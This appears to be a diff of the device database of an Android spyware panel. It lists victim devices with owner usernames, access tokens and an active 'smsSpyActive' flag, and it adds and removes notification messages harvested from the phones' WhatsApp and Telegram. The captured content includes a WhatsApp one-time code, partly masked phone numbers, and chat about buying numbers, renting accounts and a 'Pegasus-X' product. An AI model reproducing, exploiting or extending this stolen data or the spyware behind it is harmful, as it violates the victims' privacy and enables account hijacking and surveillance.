@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778529986,
+    "lastSeen": 1776778533025,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3590 pesan dari 22 chat",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778532262
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB || RULZ STORE KALBAR (678 pesan): ~ ada",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776776393293
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (5 pesan): ~ N9THCRAL",
-        "content": "💟 Stiker",
-        "time": "21/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776393140
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778530096,
+    "lastSeen": 1776778535175,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778535204
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778535189
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778535176
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778535161
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16865 pesan baru dari 118 obrolan",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778535148
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778533496
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14354,54 +14402,6 @@
         "time": "21/04 20:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777888219
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777888163
-      },
-      {
-        "appName": "Telegram",
-        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
-        "content": "Hey there KING777, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777888104
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********635\n💰 Price: Rp 3.900\n🔢 Code: 911541\n━━━━━━━━━━━━━━━\n📨 Message:\n Kode WhatsApp: 911-541\nJangan bagikan kode ini dengan orang lain\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008761101\n🏷️ System ID: FSCL71928607\n⏰ 21 Apr 2026 • 20:24 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777888087
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16808 pesan baru dari 118 obrolan",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777888068
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Testimoni Gift",
-        "content": "🎉 User Baru Masuk!\n\n👤 Hanzyy 21\n🆔 8393746943\n⏰ 21/4/2026, 13.21.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887886
-      },
-      {
-        "appName": "Telegram",
-        "sender": "⏤͟͟𝐀𝐅 || Jmbt Panjang",
-        "content": "━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥✅ DONE TRX NOREFF YAA\n━━━━━━━━━━━━━━━━━━━━━━━━\n📦:  VPS R8C4 \n💸: 9K NEGO\n💳: NOPE\n📅: 2026-21\n━━━━━━━━━━━━━━━━━━━━━━━━━\nNYARI PANEL/ROLE LEGAL MURMER?\nPV @gas_buyy",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887868
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778530210,
+    "lastSeen": 1776778533259,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
